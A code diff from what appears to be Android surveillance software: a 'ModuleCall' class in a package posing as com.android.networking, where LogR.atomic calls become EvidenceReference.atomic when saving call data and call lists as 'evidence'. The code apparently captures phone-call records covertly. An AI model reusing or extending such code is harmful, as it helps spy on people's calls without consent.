@@ -23,7 +23,7 @@ import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.conf.ConfigurationException;
 import com.android.networking.evidence.EvidenceType;
-import com.android.networking.evidence.LogR;
+import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.evidence.Markup;
 import com.android.networking.file.AutoFile;
 import com.android.networking.file.Path;
@@ -215,8 +215,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + " (saveCallEvidence), data[0:6]: " + ByteArray.byteArrayToHex(data).substring(0, 20));
 			}
 			
-			LogR.atomic(EvidenceType.CALL, additionaldata, data);
-			LogR.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
+			EvidenceReference.atomic(EvidenceType.CALL, additionaldata, data);
+			EvidenceReference.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveCallEvidence): not deleting file: " + file);
@@ -323,7 +323,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		addTypedString(databuffer, (byte) 0x04, note);
 		addTypedString(databuffer, (byte) 0x08, number);
 
-		LogR.atomic(EvidenceType.CALLLIST, null, data);
+		EvidenceReference.atomic(EvidenceType.CALLLIST, null, data);
 	}
 
 	private boolean isSupported() {
